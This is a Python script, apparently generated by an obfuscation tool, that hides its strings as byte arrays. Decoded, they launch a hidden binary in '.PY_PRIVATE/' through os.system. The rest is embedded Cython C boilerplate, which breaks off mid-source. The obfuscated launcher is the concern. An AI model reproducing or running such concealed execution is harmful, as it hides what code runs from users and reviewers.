
import os
import sys

PSH_TEAM_KEY = bytes([216, 168, 216, 174, 32, 240, 159, 145, 128]).decode()

EXECUTE_FILE = bytes([46, 80, 89, 95, 80, 82, 73, 86, 65, 84, 69, 47, 50, 48, 50, 53, 49, 48, 49, 49, 49, 48, 53, 55, 51, 48, 55, 51, 50]).decode()
PREFIX = sys.prefix
EXPORT_PYTHONHOME = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 72, 79, 77, 69, 61]).decode()+PREFIX
EXPORT_PYTHON_EXECUTABLE = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 95, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 61]).decode()+sys.executable

RUN = bytes([46, 47]).decode()+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
